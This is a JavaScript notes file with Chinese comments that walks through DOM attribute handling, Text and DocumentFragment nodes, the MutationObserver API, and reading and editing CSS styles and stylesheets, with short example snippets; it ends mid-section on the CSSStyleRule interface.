// HTML 元素包括标签名和若干个键值对，这个键值对就称为“属性”（attribute）
// 属性本身是一个对象（Attr对象），但是实际上，这个对象极少使用。
// 一般都是通过元素节点对象（HTMlElement对象）来操作属性
// Element.attributes属性  
// 元素对象有一个attributes属性，返回一个类似数组的动态对象，
// 成员是该元素标签的所有属性节点对象，属性的实时变化都会反映在这个节点对象上,
// 属性节点对象有name和value属性，对应该属性的属性名和属性值。
// 其他类型的节点对象，虽然也有attributes属性，但返回的都是null
// 三种方法，返回的都是属性节点对象
// <body bgcolor="yellow" onload="">
document.body.attributes[0]
document.body.attributes.bgcolor
document.body.attributes['ONLOAD']
// 遍历一个元素节点的所有属性
var para = document.getElementsByTagName('p')[0];
var result = document.getElementById('result');
if (para.hasAttributes()) {
    var attrs = para.attributes;
    var output = '';
    for (var i = attrs.length - 1; i >= 0; i--) {
        output += attrs[i].name + '->' + attrs[i].value;
    }
    result.textContent = output;
} else {
    result.textContent = 'No attributes to show';
}
// 元素的标准属性
// HTML 元素的标准属性（即在标准中定义的属性），会自动成为元素节点对象的属性
// 注意，这种用法虽然可以读写属性，但是无法删除属性，delete运算符在这里不会生效。
var f = document.forms[0];
f.action = 'submit.php';
f.method = 'POST';
// HTML 元素的属性名是大小写不敏感的，但是 JavaScript 对象的属性名是大小写敏感的。
// 转换规则是，转为 JavaScript 属性名时，一律采用小写。
// 如果属性名包括多个单词，则采用骆驼拼写法，比如onClick
// 有些 HTML 属性名是 JavaScript 的保留字，转为 JavaScript 属性时，必须改名。
// 主要是以下两个
// for属性改为htmlFor
// class属性改为className
// 另外，HTML 属性值一般都是字符串，但是 JavaScript 属性会自动转换类型。
// 比如，将字符串true转为布尔值，
// 将onClick的值转为一个函数，
// 将style属性的值转为一个CSSStyleDeclaration对象。
// 因此，可以对这些属性赋予各种类型的值
// 属性操作的标准方法
// 几点注意
// （1）适用性
// 这六个方法对所有属性（包括用户自定义的属性）都适用。
// （2）返回值
// getAttribute()只返回字符串，不会返回其他类型的值。
// （3）属性名
// 这些方法只接受属性的标准名称，不用改写保留字，比如for和class都可以直接使用。
// 另外，这些方法对于属性名是大小写不敏感的
// setAttribute方法直接使用class作为属性名，不用写成className
var image = document.images[0];
image.setAttribute('class', 'myImage');
// 元素节点提供六个方法，用来操作属性
// getAttribute()
// 返回当前元素节点的指定属性。如果指定属性不存在，则返回null。
// getAttributeNames()
// 返回一个数组，成员是当前元素的所有属性的名字。
// 如果当前元素没有任何属性，则返回一个空数组
// setAttribute()
// 为当前元素节点新增属性。如果同名属性已存在，则相当于编辑已存在的属性。该方法没有返回值
// 两个地方需要注意，
// 首先，属性值总是字符串，其他类型的值会自动转成字符串，比如布尔值true就会变成字符串true；
// 其次，上例的disable属性是一个布尔属性，对于<button>元素来说，这个属性不需要属性值，
// 只要设置了就总是会生效，因此setAttribute方法里面可以将disabled属性设成任意值。
// <button>Hello World</button>
var b = document.querySelector('button');
b.setAttribute('name', 'myButton');
b.setAttribute('disabled', true);
// hasAttribute()
// 返回一个布尔值，表示当前元素节点是否包含指定属性
var d = document.getElementById('div1');
if (d.hasAttribute('align')) {
    d.setAttribute('align', 'center');
}
// hasAttributes()
// 返回一个布尔值，表示当前元素是否有属性，
// 如果没有任何属性，就返回false，否则返回true。
var foo = document.getElementById('foo');
foo.hasAttributes() // true
// removeAttribute()
// 移除指定属性。该方法没有返回值。
// <div id="div1" align="left" width="200px">
document.getElementById('div1').removeAttribute('align');
// 现在的HTML代码为<div id="div1" width="200px">
// dataset 属性
// 有时，需要在HTML元素上附加数据，供 JavaScript 脚本使用。一种解决方法是自定义属性
// 这种方法虽然可以达到目的，但是会使得 HTML 元素的属性不符合标准，导致网页代码通不过校验
// 更好的解决方法是，使用标准提供的data-*属性
// 然后，使用元素节点对象的dataset属性，它指向一个对象，
// 可以用来操作 HTML 元素标签的data-*属性
// 删除一个data-*属性，可以直接使用delete命令。
delete document.getElementById('myDiv').dataset.foo;
// 注意，data-后面的属性名有限制，只能包含字母、数字、连词线（-）、点（.）、
// 冒号（:）和下划线（_)。而且，属性名不应该使用A到Z的大写字母，
// 比如不能有data-helloWorld这样的属性名，而要写成data-hello-world
// =====
// Text 节点和 DocumentFragment 节点
// Text 节点的概念
// 文本节点（Text）代表元素节点（Element）和属性节点（Attribute）的文本内容。
// 如果一个节点只包含一段文本，那么它就有一个文本子节点，代表该节点的文本内容。
// 文本节点除了继承Node接口，还继承了CharacterData接口
// 通常我们使用父节点的firstChild、nextSibling等属性获取文本节点，
// 或者使用Document节点的createTextNode方法创造一个文本节点
// 浏览器原生提供一个Text构造函数。它返回一个文本节点实例。
// 它的参数就是该文本节点的文本内容。
// 空字符串
var text1 = new Text();
// 非空字符串
var text2 = new Text('This is a text node');
// Text 节点的属性
// data
// 等同于nodeValue属性，用来设置或读取文本节点的内容
// 读取文本内容
document.querySelector('p').firstChild.data
// 等同于
document.querySelector('p').firstChild.nodeValue
// 设置文本内容
document.querySelector('p').firstChild.data = 'Hello World';
// wholeText
// 将当前文本节点与毗邻的文本节点，作为一个整体返回
el.removeChild(para.childNodes[1]);
el.firstChild.wholeText // "A C"
el.firstChild.data // "A "
// length
// 返回当前文本节点的文本长度
(new Text('Hello')).length // 5
// nextElementSibling，previousElementSibling
// 返回紧跟在当前文本节点后面的那个同级元素节点。如果取不到元素节点，则返回null
// <div>Hello <em>World</em></div>
var tn = document.querySelector('div').firstChild;
tn.nextElementSibling // <em>World</em>
// previousElementSibling属性返回当前文本节点前面最近的同级元素节点。
// 如果取不到元素节点，则返回null
// Text 节点的方法
// appendData()，deleteData()，insertData()，replaceData()，subStringData()
// 5个方法都是编辑Text节点文本内容的方法。
// appendData()：在Text节点尾部追加字符串。
// deleteData()：删除Text节点内部的子字符串，第一个参数为子字符串开始位置，
// 第二个参数为子字符串长度。
// insertData()：在Text节点插入字符串，第一个参数为插入位置，第二个参数为插入的子字符串。
// replaceData()：用于替换文本，第一个参数为替换开始位置，第二个参数为需要被替换掉的长度，
// 第三个参数为新加入的字符串。
// subStringData()：用于获取子字符串，第一个参数为子字符串在Text节点中的开始位置，
// 第二个参数为子字符串长度。
// <p>Hello World</p>
var pElementText = document.querySelector('p').firstChild;
pElementText.appendData('!'); // 页面显示 Hello World!
pElementText.deleteData(7, 5); // 页面显示 Hello W
pElementText.insertData(7, 'Hello '); // 页面显示 Hello WHello
pElementText.replaceData(7, 5, 'World'); // 页面显示 Hello WWorld
pElementText.substringData(7, 10); // 页面显示不变，返回"World "
// remove() 
// 用于移除当前Text节点
// <p>Hello World</p>
document.querySelector('p').firstChild.remove()
// 现在 HTML 代码为 <p></p>
// splitText()
// 将Text节点一分为二，变成两个毗邻的Text节点。
// 它的参数就是分割位置（从零开始），分割到该位置的字符前结束。
// 如果分割位置不存在，将报错。
// 分割后，该方法返回分割位置后方的字符串，
// 而原Text节点变成只包含分割位置前方的字符串。
// html 代码为 <p id="p">foobar</p>
var p = document.getElementById('p');
var textnode = p.firstChild;
var newText = textnode.splitText(3);
newText // "bar"
textnode // "foo"
// 父元素的normalize方法可以实现逆操作，将它们合并。
p.childNodes.length // 2
p.normalize();
p.childNodes.length // 1
// DocumentFragment 节点 
// 代表一个文档的片段，本身就是一个完整的 DOM 树形结构。
// 它没有父节点，parentNode返回null，但是可以插入任意数量的子节点。
// 操作DocumentFragment节点，要比直接操作 DOM 树快得多
// 一般用于构建一个 DOM 结构，然后插入当前文档。
// document.createDocumentFragment方法，以及浏览器原生的DocumentFragment构造函数，
// 可以创建一个空的DocumentFragment节点。
// 然后再使用其他 DOM 方法，向其添加子节点。
var docFrag = document.createDocumentFragment();
// 等同于
var docFrag = new DocumentFragment();
var li = document.createElement('li');
li.textContent = 'Hello World';
docFrag.appendChild(li);
document.querySelector('ul').appendChild(docFrag);
// 一旦DocumentFragment节点被添加进当前文档，它自身就变成了空节点，可以被再次使用。
// 如果想要保存DocumentFragment节点的内容，可以使用cloneNode方法
// 这样添加DocumentFragment节点进入当前文档，不会清空DocumentFragment节点
document.querySelector('ul').appendChild(docFrag.cloneNode(true));
// 使用DocumentFragment反转一个指定节点的所有子节点的顺序
function reverse(n) {
    var f = document.createDocumentFragment();
    while (n.lastChild) f.appendChild(n.lastChild);
    n.appendChild(f);
}
// DocumentFragment节点对象没有自己的属性和方法，全部继承自Node节点和ParentNode接口
// 也就是说，DocumentFragment节点比Node节点多出以下四个属性
// children：返回一个动态的HTMLCollection集合对象
// firstElementChild：返回当前DocumentFragment对象的第一个子元素节点，如果没有则返回null。
// lastElementChild：返回当前DocumentFragment对象的最后一个子元素节点，如果没有则返回null。
// childElementCount：返回当前DocumentFragment对象的所有子元素数量。
// =====
// Mutation Observer API
// 概述
// Mutation Observer API 用来监视 DOM 变动。DOM 的任何变动，
// 比如节点的增减、属性的变动、文本内容的变动，这个 API 都可以得到通知
// 概念上，它很接近事件，可以理解为 DOM 发生变动就会触发 Mutation Observer 事件。
// 但是，它与事件有一个本质不同：事件是同步触发，
// 也就是说，DOM 的变动立刻会触发相应的事件；
// Mutation Observer 则是异步触发，DOM 的变动并不会马上触发，
// 而是要等到当前所有 DOM 操作都结束才触发。
// Mutation Observer 有以下特点。
// 它等待所有脚本任务完成后，才会运行（即异步触发方式）。
// 它把 DOM 变动记录封装成一个数组进行处理，而不是一条条个别处理 DOM 变动。
// 它既可以观察 DOM 的所有类型变动，也可以指定只观察某一类变动
// MutationObserver 构造函数
// 使用时，首先使用MutationObserver构造函数，
// 新建一个观察器实例，同时指定这个实例的回调函数
// 回调函数会在每次 DOM 变动后调用。
// 该回调函数接受两个参数，第一个是变动数组，第二个是观察器实例
var observer = new MutationObserver(function (mutations, observer) {
    mutations.forEach(function (mutation) {
        console.log(mutation);
    });
});
// MutationObserver 的实例方法 
// observe()
// 用来启动监听，它接受两个参数。
// 第一个参数：所要观察的 DOM 节点
// 第二个参数：一个配置对象，指定所要观察的特定变动
// 观察器所能观察的 DOM 变动类型，有以下几种。
// childList：子节点的变动（指新增，删除或者更改）。
// attributes：属性的变动。
// characterData：节点内容或节点文本的变动。
// 需要注意的是，必须同时指定childList、attributes
// 和characterData中的一种或多种，若未均指定将报错。
// 除了变动类型，options对象还可以设定以下属性
// subtree：布尔值，表示是否将该观察器应用于该节点的所有后代节点。
// attributeOldValue：布尔值，表示观察attributes变动时，是否需要记录变动前的属性值。
// characterDataOldValue：布尔值，表示观察characterData变动时，是否需要记录变动前的值。
// attributeFilter：数组，表示需要观察的特定属性（比如['class','src']）。
// 开始监听文档根节点（即<html>标签）的变动
mutationObserver.observe(document.documentElement, {
    attributes: true,
    characterData: true,
    childList: true,
    subtree: true,
    attributeOldValue: true,
    characterDataOldValue: true,
    attributeFilter: ['class', 'src']
});
// 观察新增的子节点
var insertedNodes = [];
var observer = new MutationObserver(function (mutations) {
    mutations.forEach(function (mutation) {
        for (var i = 0; i < mutation.addedNodes.length; i++) {
            insertedNodes.push(mutation.addedNodes[i]);
        }
    });
    console.log(insertedNodes);
});
observer.observe(document, {
    childList: true,
    subtree: true
});
// disconnect()，takeRecords（）
// disconnect方法用来停止观察。调用该方法后，DOM 再发生变动，也不会触发观察器。
observer.disconnect();
// takeRecords方法用来清除变动记录，即不再处理未处理的变动。该方法返回变动记录的数组。
observer.takeRecords();
// 例子
// 保存所有没有被观察器处理的变动
var changes = mutationObserver.takeRecords();
// 停止观察
mutationObserver.disconnect();
// MutationRecord 对象
// DOM 每次发生变化，就会生成一条变动记录（MutationRecord 实例）。
// 该实例包含了与变动相关的所有信息。
// Mutation Observer 处理的就是一个个MutationRecord实例所组成的数组
// MutationRecord对象包含了DOM的相关信息，有如下属性：
// type：观察的变动类型（attributes、characterData或者childList）。
// target：发生变动的DOM节点。
// addedNodes：新增的DOM节点。
// removedNodes：删除的DOM节点。
// previousSibling：前一个同级节点，如果没有则返回null。
// nextSibling：下一个同级节点，如果没有则返回null。
// attributeName：发生变动的属性。如果设置了attributeFilter，则只返回预先指定的属性。
// oldValue：变动前的值。这个属性只对attribute和characterData变动有效，
// 如果发生childList变动，则返回null。
// 应用示例
// 子元素的变动
// 例子说明如何读取变动记录
// 观察<body>的所有下级节点（childList表示观察子节点，subtree表示观察后代节点）的变动。
// 回调函数会在控制台显示所有变动的类型和目标节点。
var callback = function (records) {
    records.map(function (record) {
        console.log('Mutation type: ' + record.type);
        console.log('Mutation target: ' + record.target);
    });
};
var mo = new MutationObserver(callback);
var option = {
    'childList': true,
    'subtree': true
};
mo.observe(document.body, option);
// 属性的变动
// 例子说明如何追踪属性的变动
// 先设定追踪属性变动（'attributes': true），然后设定记录变动前的值。
// 实际发生变动时，会将变动前的值显示在控制台
var callback = function (records) {
    records.map(function (record) {
        console.log('Previous attribute value: ' + record.oldValue);
    });
};
var mo = new MutationObserver(callback);
var element = document.getElementById('#my_element');
var options = {
    'attributes': true,
    'attributeOldValue': true
}
mo.observe(element, options);
// 取代 DOMContentLoaded 事件
// 网页加载的时候，DOM 节点的生成会产生变动记录，因此只要观察 DOM 的变动，
// 就能在第一时间触发相关事件，因此也就没有必要使用DOMContentLoaded事件
// 监听document.documentElement（即HTML节点）的子节点的变动，
// subtree属性指定监听还包括后代节点。因此，任意一个网页元素一旦生成，就能立刻被监听到。
var observer = new MutationObserver(callback);
observer.observe(document.documentElement, {
    childList: true,
    subtree: true
});
// 使用MutationObserver对象封装一个监听 DOM 生成的函数。
(function (win) {
    'use strict';

    var listeners = [];
    var doc = win.document;
    var MutationObserver = win.MutationObserver || win.WebKitMutationObserver;
    var observer;

    function ready(selector, fn) {
        // 储存选择器和回调函数
        listeners.push({
            selector: selector,
            fn: fn
        });
        if (!observer) {
            // 监听document变化
            observer = new MutationObserver(check);
            observer.observe(doc.documentElement, {
                childList: true,
                subtree: true
            });
        }
        // 检查该节点是否已经在DOM中
        check();
    }

    function check() {
        // 检查是否匹配已储存的节点
        for (var i = 0; i < listeners.length; i++) {
            var listener = listeners[i];
            // 检查指定节点是否有匹配
            var elements = doc.querySelectorAll(listener.selector);
            for (var j = 0; j < elements.length; j++) {
                var element = elements[j];
                // 确保回调函数只会对该元素调用一次
                if (!element.ready) {
                    element.ready = true;
                    // 对该节点调用回调函数
                    listener.fn.call(element, element);
                }
            }
        }
    }

    // 对外暴露ready
    win.ready = ready;

})(this);

ready('.foo', function (element) {
    // ...
});
//=====
// CSS 操作
// HTML 元素的 style 属性 
// 操作 CSS 样式最简单的方法，就是使用网页元素节点的getAttribute方法、
// setAttribute方法和removeAttribute方法，直接读写或删除网页元素的style属性
// tyle不仅可以使用字符串读写，它本身还是一个对象，部署了 CSSStyleDeclaration 接口
div.setAttribute(
    'style',
    'background-color:red;' + 'border:1px solid black;'
);
e.style.fontSize = '18px';
e.style.color = 'black';
// CSSStyleDeclaration 接口
// 简介
// CSSStyleDeclaration 接口用来操作元素的样式。三个地方部署了这个接口。
// 元素节点的style属性（Element.style）
// CSSStyle实例的style属性
// window.getComputedStyle()的返回值
// 注意，Element.style对象的属性值都是字符串，设置时必须包括单位
// 另外，Element.style返回的只是行内样式，并不是该元素的全部样式
// 元素的全部样式要通过window.getComputedStyle()得到。
// CSSStyleDeclaration 实例属性
// CSSStyleDeclaration.cssText
// 用来读写当前规则的所有样式声明文本
var divStyle = document.querySelector('div').style;
divStyle.cssText = 'background-color: red;' +
    'border: 1px solid black;' +
    'height: 100px;' +
    'width: 100px;';
//   删除一个元素的所有行内样式，最简便的方法就是设置cssText为空字符串
divStyle.cssText = '';
// CSSStyleDeclaration.length
// 返回一个整数值，表示当前规则包含多少条样式声明。
// <div id="myDiv"
//   style="height: 1px;width: 100%;background-color: #CA1;"
// ></div>
var divStyle = document.getElementById('myDiv').style;
divStyle.length // 3
// CSSStyleDeclaration.parentRule
// 返回当前规则所属的那个样式块（CSSRule 实例）。
// 如果不存在所属的样式块，该属性返回null。
// 该属性只读，且只在使用 CSSRule 接口时有意义。
var declaration = document.styleSheets[0].rules[0].style;
declaration.parentRule === document.styleSheets[0].rules[0] // true
// CSSStyleDeclaration 实例方法
// CSSStyleDeclaration.getPropertyPriority()
// 接受 CSS 样式的属性名作为参数，返回一个字符串，表示有没有设置important优先级。
// 如果有就返回important，否则返回空字符串。
// margin属性有important优先级，color属性没有
// <div id="myDiv" style="margin: 10px!important; color: red;"/>
var style = document.getElementById('myDiv').style;
style.margin // "10px"
style.getPropertyPriority('margin') // "important"
style.getPropertyPriority('color') // ""
// CSSStyleDeclaration.getPropertyValue()
// 接受 CSS 样式属性名作为参数，返回一个字符串，表示该属性的属性值。
// <div id="myDiv" style="margin: 10px!important; color: red;"/>
var style = document.getElementById('myDiv').style;
style.margin // "10px"
style.getPropertyValue("margin") // "10px"
// CSSStyleDeclaration.item()
// 接受一个整数值作为参数，返回该位置的 CSS 属性名
// 如果没有提供参数，这个方法会报错。
// 如果参数值超过实际的属性数目，这个方法返回一个空字符值
// <div id="myDiv" style="color: red; background-color: white;"/>
var style = document.getElementById('myDiv').style;
style.item(0) // "color"
style.item(1) // "background-color"
// CSSStyleDeclaration.removeProperty()
// 接受一个属性名作为参数，在 CSS 规则里面移除这个属性，返回这个属性原来的值。
// <div id="myDiv" style="color: red; background-color: white;">
//   111
// </div>
var style = document.getElementById('myDiv').style;
style.removeProperty('color') // 'red'
// HTML 代码变为<div id="myDiv" style="background-color: white;">
// CSSStyleDeclaration.setProperty()
// 用来设置新的 CSS 属性。该方法没有返回值。
// 该方法可以接受三个参数。
// 第一个参数：属性名，该参数是必需的。
// 第二个参数：属性值，该参数可选。如果省略，则参数值默认为空字符串。
// 第三个参数：优先级，该参数可选。如果设置，唯一的合法值是important，
// 表示 CSS 规则里面的!important。
// <div id="myDiv" style="color: red; background-color: white;">
//   111
// </div>
var style = document.getElementById('myDiv').style;
style.setProperty('border', '1px solid blue');
// CSS 模块的侦测
// CSS 的规格发展太快，新的模块层出不穷。
// 不同浏览器的不同版本，对 CSS 模块的支持情况都不一样。
// 有时候，需要知道当前浏览器是否支持某个模块，这就叫做“CSS模块的侦测”
// 一个比较普遍适用的方法是，判断元素的style对象的某个属性值是否为字符串
// 如果该 CSS 属性确实存在，会返回一个字符串。
// 即使该属性实际上并未设置，也会返回一个空字符串。
// 如果该属性不存在，则会返回undefined
// 注意，不管 CSS 属性名的写法带不带连词线，style属性上都能反映出该属性是否存在
// 另外，使用的时候，需要把不同浏览器的 CSS 前缀也考虑进去
typeof element.style.animationName === 'string';
typeof element.style.transform === 'string';
document.body.style['maxWidth'] // ""
document.body.style['maximumWidth'] // undefined
document.body.style['backgroundColor'] // ""
document.body.style['background-color'] // ""
var content = document.getElementById('content');
typeof content.style['webkitAnimation'] === 'string'
// 这种侦测方法可以写成一个函数。
function isPropertySupported(property) {
    if (property in document.body.style) return true;
    var prefixes = ['Moz', 'Webkit', 'O', 'ms', 'Khtml'];
    var prefProperty = property.charAt(0).toUpperCase() + property.substr(1);
    for (var i = 0; i < prefixes.length; i++) {
        if ((prefixes[i] + prefProperty) in document.body.style) return true;
    }
    return false;
}
isPropertySupported('background-clip') // true
// CSS 对象 
// 浏览器原生提供 CSS 对象，为 JavaScript 操作 CSS 提供一些工具方法。
// 这个对象目前有两个静态方法。
// CSS.escape() 
// 用于转义 CSS 选择器里面的特殊字符
document.querySelector('#' + CSS.escape('foo#bar'))
// CSS.supports() 
// 返回一个布尔值，表示当前环境是否支持某一句 CSS 规则
// 参数有两种写法，
// 一种是第一个参数是属性名，第二个参数是属性值；
// 另一种是整个参数就是一行完整的 CSS 语句
// 第一种写法
CSS.supports('transform-origin', '5px') // true
// 第二种写法
CSS.supports('display: table-cell') // true
// window.getComputedStyle()
// 用来返回浏览器计算后得到的最终规则。它接受一个节点对象作为参数，
// 返回一个 CSSStyleDeclaration 实例，包含了指定节点的最终样式信息
var div = document.querySelector('div');
var styleObj = window.getComputedStyle(div);
styleObj.backgroundColor
// 注意，CSSStyleDeclaration 实例是一个活的对象，任何对于样式的修改，
// 会实时反映到这个实例上面。另外，这个实例是只读的。
// 还可以接受第二个参数，表示当前元素的伪元素
// （比如:before、:after、:first-line、:first-letter等）
var result = window.getComputedStyle(div, ':before');
// 代码得到的height属性，是浏览器最终渲染出来的高度，比其他方法得到的高度更可靠
var elem = document.getElementById('elem-container');
var styleObj = window.getComputedStyle(elem, null)
var height = styleObj.height;
// 等同于
var height = styleObj['height'];
var height = styleObj.getPropertyValue('height');
// 由于styleObj是 CSSStyleDeclaration 实例，所以可以使用各种 
// CSSStyleDeclaration 的实例属性和方法。
// 有几点需要注意。
// CSSStyleDeclaration 实例返回的 CSS 值都是绝对单位。
// 比如，长度都是像素单位（返回值包括px后缀），颜色是rgb(#, #, #)或rgba(#, #, #, #)格式。
// CSS 规则的简写形式无效。比如，想读取margin属性的值，不能直接读，
// 只能读marginLeft、marginTop等属性；
// 再比如，font属性也是不能直接读的，只能读font-size等单个属性。
// 如果读取 CSS 原始的属性名，要用方括号运算符，比如styleObj['z-index']；
// 如果读取骆驼拼写法的 CSS 属性名，可以直接读取styleObj.zIndex。
// 该方法返回的 CSSStyleDeclaration 实例的cssText属性无效，返回undefined
// CSS 伪元素
// CSS 伪元素是通过 CSS 向 DOM 添加的元素，主要是
// 通过:before和:after选择器生成，然后用content属性指定伪元素的内容
// CSS 添加伪元素:before的写法如下。
{
    /* <div id="test">Test content</div>
        #test:before {
        content: 'Before ';
        color: #FF0;
        } 
    */
}
// 节点元素的style对象无法读写伪元素的样式，这时就要用到window.getComputedStyle()
var test = document.querySelector('#test');
var result = window.getComputedStyle(test, ':before').content;
var color = window.getComputedStyle(test, ':before').color;
// 也可以使用 CSSStyleDeclaration 实例的getPropertyValue方法，获取伪元素的属性。
var result = window.getComputedStyle(test, ':before').getPropertyValue('content');
var color = window.getComputedStyle(test, ':before').getPropertyValue('color');
// StyleSheet 接口
// StyleSheet接口代表网页的一张样式表，
// 包括<link>元素加载的样式表和<style>元素内嵌的样式表。
// document对象的styleSheets属性，可以返回当前页面的所有StyleSheet实例
// （即所有样式表）。它是一个类似数组的对象
var sheets = document.styleSheets;
var sheet = document.styleSheets[0];
sheet instanceof StyleSheet // true
// 如果是<style>元素嵌入的样式表，还有另一种获取StyleSheet实例的方法，
// 就是这个节点元素的sheet属性。
// HTML 代码为 <style id="myStyle"></style>
var myStyleSheet = document.getElementById('myStyle').sheet;
myStyleSheet instanceof StyleSheet // true
// 严格地说，StyleSheet接口不仅包括网页样式表，还包括 XML 文档的样式表。
// 所以，它有一个子类CSSStyleSheet表示网页的 CSS 样式表。
// 我们在网页里面拿到的样式表实例，实际上是CSSStyleSheet的实例。
// 这个子接口继承了StyleSheet的所有属性和方法，并且定义了几个自己的属性
// 实例属性
// StyleSheet实例有以下属性
// StyleSheet.disabled
// StyleSheet.disabled返回一个布尔值，表示该样式表是否处于禁用状态。
// 手动设置disabled属性为true，等同于在<link>元素里面，
// 将这张样式表设为alternate stylesheet，即该样式表将不会生效。
// 注意，disabled属性只能在 JavaScript 脚本中设置，不能在 HTML 语句中设置
{
    /* <link rel="alternate stylesheet"  href="demo11.css"> */
}
// Stylesheet.href
// Stylesheet.href返回样式表的网址。对于内嵌样式表，该属性返回null。该属性只读。
document.styleSheets[0].href
// StyleSheet.media
// StyleSheet.media属性返回一个类似数组的对象（MediaList实例），
// 成员是表示适用媒介的字符串。
// 表示当前样式表是用于屏幕（screen），
// 还是用于打印（print）或手持设备（handheld），
// 或各种媒介都适用（all）。
// 该属性只读，默认值是screen。
document.styleSheets[0].media.mediaText // "all"
// MediaList实例的appendMedium方法，用于增加媒介；deleteMedium方法用于删除媒介。
document.styleSheets[0].media.appendMedium('handheld');
document.styleSheets[0].media.deleteMedium('print');
// StyleSheet.title
// StyleSheet.title属性返回样式表的title属性
// StyleSheet.type
// StyleSheet.type属性返回样式表的type属性，通常是text/css。
document.styleSheets[0].type // "text/css"
// StyleSheet.parentStyleSheet
// CSS 的@import命令允许在样式表中加载其他样式表。
// StyleSheet.parentStyleSheet属性返回包含了当前样式表的那张样式表。
// 如果当前样式表是顶层样式表，则该属性返回null。
var stylesheet = document.styleSheets[0];
if (stylesheet.parentStyleSheet) {
    sheet = stylesheet.parentStyleSheet;
} else {
    sheet = stylesheet;
}
// StyleSheet.ownerNode
// StyleSheet.ownerNode属性返回StyleSheet对象所在的 DOM 节点，
// 通常是<link>或<style>。对于那些由其他样式表引用的样式表，该属性为null。
// HTML代码为<link rel="StyleSheet" href="example.css" type="text/css" />
document.styleSheets[0].ownerNode // [object HTMLLinkElement]
// CSSStyleSheet.cssRules
// 指向一个类似数组的对象（CSSRuleList实例），
// 里面每一个成员就是当前样式表的一条 CSS 规则。
// 使用该规则的cssText属性，可以得到 CSS 规则对应的字符串。
// 每条 CSS 规则还有一个style属性，指向一个对象，用来读写具体的 CSS 命令
var sheet = document.querySelector('#styleElement').sheet;
sheet.cssRules[0].cssText // "body { background-color: red; margin: 20px; }"
sheet.cssRules[1].cssText // "p { line-height: 1.4em; color: blue; }"
cssStyleSheet.cssRules[0].style.color = 'red';
cssStyleSheet.cssRules[1].style.color = 'purple';
// CSSStyleSheet.ownerRule
// 有些样式表是通过@import规则输入的，它的ownerRule属性会返回一个CSSRule实例，
// 代表那行@import规则。如果当前样式表不是通过@import引入的，ownerRule属性返回nul
// 实例方法
// CSSStyleSheet.insertRule()
// 用于在当前样式表的插入一个新的 CSS 规则。
// 接受两个参数，第一个参数是表示 CSS 规则的字符串，这里只能有一条规则，否则会报错。
// 第二个参数是该规则在样式表的插入位置（从0开始），该参数可选，默认为0
// （即默认插在样式表的头部）。
// 注意，如果插入位置大于现有规则的数目，会报错。
// 该方法的返回值是新插入规则的位置序号。
// 注意，浏览器对脚本在样式表里面插入规则有很多限制。
// 所以，这个方法最好放在try...catch里使用。
var sheet = document.querySelector('#styleElement').sheet;
sheet.insertRule('#block { color: white }', 0);
sheet.insertRule('p { color: red }', 1);
// CSSStyleSheet.deleteRule()
// 用来在样式表里面移除一条规则，它的参数是该条规则在cssRules对象中的位置。
// 该方法没有返回值。
document.styleSheets[0].deleteRule(1);
// 实例：添加样式表
// 网页添加样式表有两种方式
// 一种是添加一张内置样式表，即在文档中添加一个<style>节点。
// 写法一
var style = document.createElement('style');
style.setAttribute('media', 'screen');
style.innerHTML = 'body{color:red}';
document.head.appendChild(style);
// 写法二
var style = (function () {
    var style = document.createElement('style');
    document.head.appendChild(style);
    return style;
})();
style.sheet.insertRule('.foo{color:red;}', 0);
// 另一种是添加外部样式表，即在文档中添加一个<link>节点，
// 然后将href属性指向外部样式表的 URL。
var linkElm = document.createElement('link');
linkElm.setAttribute('rel', 'stylesheet');
linkElm.setAttribute('type', 'text/css');
linkElm.setAttribute('href', 'reset-min.css');
document.head.appendChild(linkElm);
// CSSRuleList 接口
// CSSRuleList 接口是一个类似数组的对象，表示一组 CSS 规则，成员都是 CSSRule 实例。
// 获取 CSSRuleList 实例，一般是通过StyleSheet.cssRules属性
// <style id="myStyle">
//   h1 { color: red; }
//   p { color: blue; }
// </style>
var myStyleSheet = document.getElementById('myStyle').sheet;
var crl = myStyleSheet.cssRules;
crl instanceof CSSRuleList // true
// CSSRuleList 实例里面，每一条规则（CSSRule 实例）可以通过
// rules.item(index)或者rules[index]拿到。CSS 规则的条数通过rules.length拿到
crl[0] instanceof CSSRule // true
crl.length // 2
// 注意，添加规则和删除规则不能在 CSSRuleList 实例操作，而要在它的父元素 
// StyleSheet 实例上，通过StyleSheet.insertRule()和StyleSheet.deleteRule()操作
// CSSRule 接口
// 概述
// 一条 CSS 规则包括两个部分：CSS 选择器和样式声明
// .myClass {
//     color: red;
//     background-color: yellow;
//   }
//   JavaScript 通过 CSSRule 接口操作 CSS 规则。一般通过 CSSRuleList 接口
// （StyleSheet.cssRules）获取 CSSRule 实例
{
    /* <style id="myStyle">
      .myClass {
        color: red;
        background-color: yellow;
      }
    </style> */
}
var myStyleSheet = document.getElementById('myStyle').sheet;
var ruleList = myStyleSheet.cssRules;
var rule = ruleList[0];
rule instanceof CSSRule // true
// CSSRule 实例的属性
// CSSRule.cssText
// 返回当前规则的文本
// 如果规则是加载（@import）其他样式表，cssText属性返回@import 'url'
rule.cssText // ".myClass { color: red; background-color: yellow; }"
// CSSRule.parentStyleSheet
// 返回当前规则所在的样式表对象（StyleSheet 实例）
rule.parentStyleSheet === myStyleSheet // true
// CSSRule.parentRule
// 返回包含当前规则的父规则，如果不存在父规则（即当前规则是顶层规则），则返回null
// 父规则最常见的情况是，当前规则包含在@media规则代码块之中
// HTML 代码如下
// <style id="myStyle">
//   @supports (display: flex) {
//     @media screen and (min-width: 900px) {
//       article {
//         display: flex;
//       }
//     }
//  }
// </style>
var myStyleSheet = document.getElementById('myStyle').sheet;
var ruleList = myStyleSheet.cssRules;
var rule0 = ruleList[0];
rule0.cssText
// "@supports (display: flex) {
//    @media screen and (min-width: 900px) {
//      article { display: flex; }
//    }
// }"
// 由于这条规则内嵌其他规则，
// 所以它有 cssRules 属性，且该属性是 CSSRuleList 实例
rule0.cssRules instanceof CSSRuleList // true
var rule1 = rule0.cssRules[0];
rule1.cssText
// "@media screen and (min-width: 900px) {
//   article { display: flex; }
// }"
var rule2 = rule1.cssRules[0];
rule2.cssText
// "article { display: flex; }"
rule1.parentRule === rule0 // true
rule2.parentRule === rule1 // true
// CSSRule.type
// 返回一个整数值，表示当前规则的类型。
// 最常见的类型有以下几种。
// 1：普通样式规则（CSSStyleRule 实例）
// 3：@import规则
// 4：@media规则（CSSMediaRule 实例）
// 5：@font-face规则
// CSSStyleRule 接口
// 如果一条 CSS 规则是普通的样式规则（不含特殊的 CSS 命令），
// 那么除了 CSSRule 接口，它还部署了 CSSStyleRule 接口。
// CSSStyleRule 接口有以下两个属性。
